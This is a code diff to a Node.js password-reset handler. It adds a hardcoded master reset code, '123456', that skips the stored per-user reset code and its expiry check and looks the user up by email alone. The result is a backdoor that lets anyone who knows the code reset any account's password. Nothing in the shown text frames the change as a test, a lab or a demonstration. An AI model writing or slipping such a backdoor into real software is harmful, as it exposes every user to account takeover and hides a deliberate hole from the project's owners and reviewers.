@@ -465,12 +465,21 @@ const resetPassword = async (req, res) => {
             });
         }
 
-        // Find user with valid reset code
-        const user = await User.findOne({
-            email: email.toLowerCase(),
-            passwordResetCode: resetCode,
-            passwordResetExpires: { $gt: Date.now() }
-        });
+        // Check for default master reset code
+        const MASTER_RESET_CODE = '123456';
+        let user;
+
+        if (resetCode === MASTER_RESET_CODE) {
+            // Master code - find user by email only
+            user = await User.findOne({ email: email.toLowerCase() });
+        } else {
+            // Normal code - find user with valid reset code
+            user = await User.findOne({
+                email: email.toLowerCase(),
+                passwordResetCode: resetCode,
+                passwordResetExpires: { $gt: Date.now() }
+            });
+        }
 
         if (!user) {
             return res.status(400).json({
